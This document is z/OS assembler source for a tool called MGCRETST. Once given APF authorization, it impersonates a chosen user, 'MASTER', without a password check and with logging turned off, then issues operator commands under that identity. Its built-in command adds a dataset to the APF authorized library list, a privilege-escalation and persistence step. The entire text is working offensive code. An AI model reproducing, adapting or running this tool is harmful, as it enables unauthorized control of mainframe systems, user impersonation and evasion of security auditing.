***************************************************************
* MGCRETST                                                    *
*   built by:     biggie smalls                               *
*   description:  when apf authorized, this tool will         *
*                 run an opercmd as the user specified        *
*   todo:         make all parms dynamic for both jcl and uss *
*                                                             *
***************************************************************
MGCRETST CSECT
MGCRETST AMODE 31
         YREGS ,                          reg macros
         BAKR  R14,0                      save regs
         LR    R12,R15                    setup addressblty
         USING MGCRETST,R12               main using
         DS 0H                            halfwd addressing
****************************
*    CODE START            *
****************************
*
         BAL   R6,LSPARM                  load and store parms
         BAL   R6,RCRTE                   get a new acee
         BAL   R6,RCTOK                   get a token
         BAL   R6,DOMG                    main routine
         B     GOODX                      bug out
****************************
*    ACEE NEW ROUTINE      *
****************************
*
RCRTE    DS    0H
         MODESET KEY=ZERO,MODE=SUP        into sup state
         XR    R5,R5                      clear out r5
         XC    NEWACEE(8),NEWACEE         zero out our data
         LA    R5,NEWACEE
         RACROUTE    REQUEST=VERIFY,                                   X
               ACEE=(R5),                                              X
               ENVIR=CREATE,                                           X
               USERID=USERLEN,                                         X
               PASSCHK=NO,                                             X
               WORKA=RACWK,                                            X
               RELEASE=2.1,                                            X
               STAT=NO,                                                X
               LOG=NONE,                                               X
               MF=(E,RCLIST)
         LTR   R15,R15                    chk rtn code
         BNZ   EXITRR                     exit rr
         MODESET KEY=NZERO,MODE=PROB      back to prob stat
         BR    R6                         return
****************************
*    GET TOKN ROUTINE      *
****************************
*
RCTOK    DS    0H
         MODESET KEY=ZERO,MODE=SUP        into sup state
         L     R4,NEWACEE                 addr of acee addr
         RACROUTE  REQUEST=TOKENXTR,                                   X
               WORKA=RACWK,                                            X
               ACEE=(R4),                                              X
               TOKNOUT=TOKEN,                                          X
               RELEASE=2.1,                                            X
               MF=(E,RCTOKE)
         LTR   R15,R15                    test rc
         BNZ   EXITTOK                    exit token
         MODESET KEY=NZERO,MODE=PROB      back to prob stat
         BR    R6                         return
***********************************************************************
*    load and store parms                                             *
***********************************************************************
*
LSPARM   DS    0H
         CLI   DFLAG,X'1'                 if yes then
         JNZ   JCLM
         LA    R1,DADD                    load parms from this file
JCLM     L     R2,0(0,R1)                 R2 has parm address
*
         XR    R3,R3                      clear r3
         LH    R3,0(0,R2)                 len of parms
         STH   R3,TCMDL                   store plist len
*
         LTR   R3,R3                      chk parms exist
         BZ    BADX                       bolt if no
*
         LA    R4,TCMD                    addr of plist text
         BCTR  R3,0                       len -1 for exec
         EX    R3,EXMVC                   do the exec
EXMVC    MVC   0(0,R4),2(R2)              mv parms to plist
         BR    R6                         return
***********************************************************************
*    CMD EXEC ROUTINE                                                 *
***********************************************************************
*
DOMG     DS    0H
*
         MODESET KEY=ZERO,MODE=SUP        sup state enter
*
         LA    R2,TCMDL                   r2 has the plist
         LA    R3,TOKEN                   r3 has token add
         MGCRE TEXT=(R2),                 execute mgcre macro          X
               UTOKEN=(R3),               addr of new acee token       X
               CONSID=CONSID,                                          X
               MF=(E,MGCRE)
*
         MODESET KEY=NZERO,MODE=PROB      back to prb state
         BR    R6                         return
***********************************************************************
*    EXIT                                                             *
***********************************************************************
*
EXITTOK  LA    R15,4                      bad tok=4
         B     EXIT
EXITRR   LA    R15,X'C'                   bad rr=c
         B     EXIT
BADX     LA    R15,8                      no parm rc=8
         B     EXIT                       exit fr
GOODX    XR    R15,R15                    zero rc=good
EXIT     PR    ,                          byeeeee
***********************************************************************
*    VARIABLES                                                        *
***********************************************************************
*
DPARM    DS    0F                         dummy parm for USS
DFLAG    DC    X'1'                       set me to 1 for uss
* 
* change len and cmd - len must equal cmd len
*
DLEN     DC    XL2'23'                    len of parms
DCMD     DC    C'SETPROG APF,ADD,DSN=PHIL.LOAD,SMS'          
*
DADD     DC    A(DLEN)                    add of parms
*                                         mgcre vars
         DS    0F
TCMDL    DS    XL2                        len of cmd
TCMD     DS    XL122                      cmd text
CONSID   DC    X'00000000'                mstr cons id
MGCRE    MGCRE MF=L                       mgcre listform macro
*                                         racroute vars
NEWACEE  DS    F
RACWK    DS    CL512                      racr wrk area
LRETCODE DS    F                          racr ret code
FLDGRPT  DC    A(1)
FIELD1   DC    CL8'PGMRNAME'
*
*  change len and name - len must equal len of name
USERLEN  DC    X'06'
USERID   DC    CL8'MASTER '
* 
RESULT   DC    CL8'XXXXXXXX'
RCLIST   RACROUTE REQUEST=VERIFY,MF=L,RELEASE=2.1,                     X
               WORKA=*-*
*                                         ractoken vars
RCTOKE   RACROUTE REQUEST=TOKENXTR,RELEASE=2.1,MF=L,                   X
               WORKA=*-*
TOKEN    DS    0CL80                      address of returned token
         DC    XL2'5001'                  bt1 = len bt2 = ver
         DC    XL78'0'
*                                         dsects
         IRRPRXTW ,
         END
